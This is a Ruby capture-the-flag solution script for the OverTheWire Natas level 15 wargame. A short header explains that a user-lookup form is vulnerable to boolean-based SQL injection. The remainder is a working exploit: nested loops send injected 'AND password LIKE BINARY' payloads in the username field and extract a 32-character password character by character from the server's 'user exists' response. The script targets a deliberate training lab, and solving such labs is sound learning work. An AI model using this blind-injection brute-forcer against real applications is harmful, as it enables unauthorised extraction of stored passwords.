=begin
20 July 2017
The application has a functionality that allows you to check if a user exists. It is vulnerable to SQL injection, but
MySQL does not allow you to run batch SQL queries, thus it is a boolean injection. By writing a brute forcer, we can
recover the password using " AND password LIKE "
=end
require 'net/http'

host = 'natas15.natas.labs.overthewire.org'
username = 'natas15'

print "Password please: " # Ask user for the password

password = gets.chomp

uri = URI("http://#{host}/index.php")

req = Net::HTTP::Get.new(uri)
req.basic_auth username, password

res = Net::HTTP.start(uri.hostname, uri.port) { |http|
  http.request(req)
}

# Send a test request to make sure that the application is up and our credentials work
code = res.code
puts "Checking connection, response: #{code} #{res.message}"
abort("Non-200 response. Aborting.") unless code == "200"
puts "Connection Successful. Starting the brute force attack."

# Passwords are 32 characters composed of random upper- / lower-case letters and numbers
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passNew = ''

post = Net::HTTP::Post.new(uri)
post.basic_auth username, password

# Perform a character-by-character brute force using two nested loops
res = Net::HTTP.start(uri.hostname, uri.port) do |http|
  (1..32).each do
    charset.split("").each do |j|
      post.set_form_data('username' => "natas16\" AND password LIKE BINARY \"#{passNew + j}%") # Our injection
      response = http.request(post)
      case res
      when Net::HTTPSuccess
        # Check response for match
        if response.body.include? "user exists"
          passNew = passNew + j
          print "Brute forcing: #{passNew}\r"
          $stdout.flush
          break
        end
      else
        puts "Error, request failed: #{response.code} #{response.message}"
      end
    end
  end
end

print "\033[K"
puts "Done: #{passNew}"
